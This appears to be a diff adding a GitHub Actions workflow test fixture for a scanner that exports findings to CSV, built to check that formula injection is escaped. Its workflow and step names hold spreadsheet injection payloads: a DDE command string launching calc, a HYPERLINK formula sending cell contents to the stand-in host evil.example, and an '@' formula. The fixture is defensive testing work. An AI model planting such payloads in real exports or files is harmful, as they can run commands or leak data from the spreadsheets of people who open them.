@@ -1,0 +1,32 @@
+# CSV-injection fixture. Nothing here runs: it lives under testdata/, not in
+# the repository's real .github/workflows/.
+#
+# The test copies this file as '=evil.yml', because the payload is the FILE
+# NAME: the collector turns it into the job name, which becomes the CSV
+# `context` column. This case covers a bare `=` trigger.
+# The hostile name is applied at copy time rather than committed, since a
+# leading space breaks checkouts on Windows.
+#
+# The values below are also attacker-controlled in a real scan: the workflow
+# name, the step names, the image tag and the action refs.
+#
+# Every value below is one a scanned project controls, so each is a candidate
+# for landing at the start of a CSV cell:
+#   - the FILE NAME becomes the job name prefix ("=evil/build"), which is the
+#     CSV `context` column. This is the reachable vector.
+#   - the step `name:` becomes the finding's step, used by the fingerprint.
+#   - the workflow `name:` and job ids are attacker-chosen too.
+name: "=cmd|'/c calc'!A1"
+on: push
+permissions:
+  contents: read
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    container:
+      image: alpine:latest
+    steps:
+      - name: "=HYPERLINK(\"http://evil.example/\"&A2,\"click\")"
+        uses: tj-actions/changed-files@v45
+      - name: "@SUM(1+1)"
+        uses: dorny/paths-filter@v3
